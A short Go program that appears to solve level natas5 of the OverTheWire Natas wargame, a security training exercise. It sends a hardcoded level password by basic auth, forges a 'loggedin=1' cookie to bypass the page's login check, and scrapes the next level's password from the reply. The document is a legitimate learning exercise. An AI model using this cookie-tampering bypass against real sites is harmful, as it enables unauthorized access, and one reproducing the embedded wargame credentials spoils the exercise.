package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"regexp"
	"strings"
)

var (
	username = "natas5"
	password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
	url = "http://natas5.natas.labs.overthewire.org" 
)

func main (){
	request, _ := http.NewRequest("GET", url, nil)

	request.SetBasicAuth(username, password)
	// request.Header.Set("Referer", "http://natas5.natas.labs.overthewire.org/")
	cookies := &http.Cookie{Name: "loggedin", Value: "1"}
	request.AddCookie(cookies)
	response, _ := http.DefaultClient.Do(request)
	defer response.Body.Close()

	content ,_ := ioutil.ReadAll(response.Body)
	// fmt.Println(string(content))
	regex := regexp.MustCompile(`The password for natas(.*)`)
	almost := strings.Split(regex.FindAllString(string(content), 1)[0], " ")
	answer := strings.Split(almost[len(almost) - 1], "<")
	fmt.Println(answer)
}